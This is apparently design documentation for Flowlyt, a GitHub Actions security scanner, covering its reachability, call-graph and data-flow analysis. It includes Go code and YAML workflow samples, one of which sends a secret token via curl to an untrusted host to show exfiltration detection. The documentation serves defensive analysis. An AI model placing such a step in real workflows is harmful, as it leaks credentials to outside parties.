# AST-Based Reachability and Call Graph Analysis

This document describes the new AST-based analysis capabilities in Flowlyt that enable reachability analysis and call graph analysis to reduce false positives and catch issues in reachable code paths.

## Overview

The AST-enhanced analysis engine extends Flowlyt's existing hybrid engine with:

1. **Reachability Analysis** - Determines which parts of workflows are actually reachable during execution
2. **Call Graph Analysis** - Builds a graph of dependencies and calls between jobs, steps, and actions
3. **Data Flow Analysis** - Tracks how sensitive data flows through the workflow
4. **False Positive Reduction** - Filters out findings in unreachable code paths

## Architecture

### Core Components

#### 1. AST Analyzer (`pkg/analysis/ast/ast.go`)
The main orchestrator that coordinates parsing, reachability, and data flow analysis.

```go
type ASTAnalyzer struct {
    callGraph    *CallGraph
    dataFlow     *DataFlowAnalyzer  
    reachability *ReachabilityAnalyzer
}
```

#### 2. Call Graph (`pkg/analysis/ast/callgraph.go`)
Builds and maintains a graph of workflow components and their relationships.

```go
type CallGraph struct {
    nodes map[string]*CallNode
    edges map[string][]string
}
```

#### 3. Reachability Analyzer (`pkg/analysis/ast/reachability.go`)
Determines which nodes are reachable from entry points (triggers).

```go
type ReachabilityAnalyzer struct {
    callGraph      *CallGraph
    reachableNodes map[string]bool
    conditions     map[string]*ConditionAnalyzer
}
```

#### 4. Data Flow Analyzer (`pkg/analysis/ast/dataflow.go`)
Tracks data sources, sinks, and flows to identify potential security issues.

```go
type DataFlowAnalyzer struct {
    sources map[string]*DataSource
    sinks   map[string]*DataSink
    flows   []*DataFlow
}
```

## Key Features

### Reachability Analysis

The reachability analyzer determines which parts of a workflow can actually be executed:

1. **Entry Point Detection**: Identifies workflow triggers as entry points
2. **Dependency Tracking**: Follows job dependencies (`needs` relationships)
3. **Conditional Analysis**: Evaluates `if` conditions to determine reachability
4. **Static Evaluation**: Performs static analysis on simple conditions

**Example of unreachable code detection:**

```yaml
jobs:
  never-runs:
    if: false  # Statically false condition
    runs-on: ubuntu-latest
    steps:
      - run: echo "This will never execute"
        env:
          SECRET: ${{ secrets.API_KEY }}  # Finding here would be false positive
```

### Call Graph Analysis

Builds a comprehensive graph of workflow components:

1. **Node Types**: 
   - `trigger` - Workflow triggers (push, PR, etc.)
   - `job` - Individual jobs
   - `step` - Steps within jobs
   - `action` - External actions being used
   - `external_call` - Network calls, file operations, etc.

2. **Edge Types**:
   - Trigger to job relationships
   - Job dependency relationships (`needs`)
   - Step execution order
   - Action invocations
   - External command calls

### Data Flow Analysis

Tracks sensitive data movement through workflows:

1. **Data Sources**:
   - Secrets (`${{ secrets.* }}`)
   - GitHub context (`${{ github.* }}`)
   - Environment variables
   - Action outputs

2. **Data Sinks**:
   - Network calls (curl, wget)
   - File operations
   - Logging commands
   - Action inputs

3. **Flow Detection**:
   - Identifies when sensitive data reaches potentially unsafe sinks
   - Calculates severity based on data sensitivity and sink risk
   - Provides detailed remediation advice

## Usage

### Basic Usage

```go
import (
    "github.com/harekrishnarai/flowlyt/pkg/engine"
    "github.com/harekrishnarai/flowlyt/pkg/parser"
)

// Create enhanced engine with AST analysis
config := engine.DefaultASTEnhancedConfig()
config.EnableReachabilityAnalysis = true
config.EnableDataFlowAnalysis = true
config.FilterUnreachableFindings = true

enhancedEngine, err := engine.NewASTEnhancedEngine(config)
if err != nil {
    log.Fatal(err)
}

// Analyze workflows
workflowFiles := []parser.WorkflowFile{
    {Path: ".github/workflows/ci.yml", Content: workflowContent},
}

result, err := enhancedEngine.AnalyzeWithAST(context.Background(), workflowFiles)
if err != nil {
    log.Fatal(err)
}

// Access enhanced results
fmt.Printf("Reachable nodes: %d\n", result.ReachabilityReport.ReachableNodes)
fmt.Printf("Data flow findings: %d\n", len(result.DataFlowFindings))
fmt.Printf("Filtered findings: %d\n", result.FilteredFindings)
```

### Configuration Options

```go
type ASTEnhancedConfig struct {
    EnableReachabilityAnalysis bool   // Enable reachability analysis
    EnableDataFlowAnalysis     bool   // Enable data flow tracking
    EnableCallGraphAnalysis    bool   // Enable call graph construction
    FilterUnreachableFindings  bool   // Filter findings in unreachable code
    MinDataFlowSeverity       string // Minimum severity for data flow findings
    ReachabilityConfig        ReachabilityConfig
}

type ReachabilityConfig struct {
    AnalyzeConditionals      bool // Analyze conditional expressions
    StaticEvaluation         bool // Perform static evaluation of conditions
    MarkUnreachableFindings  bool // Mark unreachable findings instead of filtering
    ReportUnreachableCode    bool // Include unreachable code in reports
}
```

## Benefits

### 1. Reduced False Positives

By filtering out findings in unreachable code paths, the analysis becomes more precise:

```yaml
jobs:
  security-scan:
    if: github.event_name == 'never'  # Will never be true
    steps:
      - run: echo ${{ secrets.API_KEY }}  # Finding filtered out as unreachable
```

### 2. Enhanced Detection

Data flow analysis catches complex security issues:

```yaml
steps:
  - name: Get API data
    run: |
      # Data flow analysis detects secret exposure via network
      curl -H "Auth: ${{ secrets.TOKEN }}" https://untrusted.com/api
```

### 3. Context Awareness

Understanding job dependencies and execution flow:

```yaml
jobs:
  build:
    outputs:
      version: ${{ steps.version.outputs.version }}
    steps:
      - id: version
        run: echo "version=1.0.0" >> $GITHUB_OUTPUT
  
  deploy:
    needs: build
    steps:
      - run: |
          # Analysis understands this depends on build job output
          echo "Deploying version ${{ needs.build.outputs.version }}"
```

## Security Rules Enhanced

The AST analysis enhances existing security rules and adds new categories:

### New Rule Categories

1. **CategoryReachability** - Issues related to unreachable code
2. **CategoryDataFlow** - Data flow security violations  
3. **CategoryCallGraph** - Issues detected through call graph analysis

### Enhanced Detection

- **Secret Exposure**: Tracks secret usage from source to potential leak points
- **Privilege Escalation**: Analyzes permission flows and escalation paths
- **Supply Chain**: Maps action dependencies and external calls
- **Data Exfiltration**: Detects sensitive data sent to external endpoints

## Performance Considerations

The AST analysis adds computational overhead but provides significant security benefits:

- **Parsing**: ~10-20ms per workflow file
- **Call Graph**: ~5-10ms per workflow
- **Reachability**: ~10-30ms depending on complexity
- **Data Flow**: ~20-50ms depending on sources/sinks

Total overhead is typically 50-100ms per workflow, which is acceptable for most use cases.

## Limitations

1. **Dynamic Conditions**: Cannot analyze conditions that depend on runtime values
2. **Complex Expressions**: Limited static evaluation of complex conditional logic
3. **Cross-Workflow**: Currently analyzes workflows in isolation
4. **Action Internals**: Cannot see inside third-party actions

## Future Enhancements

1. **Cross-Workflow Analysis**: Track dependencies between workflows
2. **Dynamic Analysis**: Integrate with runtime information
3. **Action Scanning**: Deep analysis of popular GitHub Actions
4. **Machine Learning**: Use ML to improve condition analysis
5. **Performance Optimization**: Caching and incremental analysis

## Integration with Existing Rules

The AST analysis works alongside existing pattern-based rules:

1. **Pattern Rules**: Continue to work for basic detection
2. **AST Enhancement**: Provides additional context and filtering
3. **Combined Results**: Merges findings from both approaches
4. **Confidence Scoring**: AST analysis can increase confidence in findings

This creates a layered security approach that combines the speed of pattern matching with the precision of AST analysis.
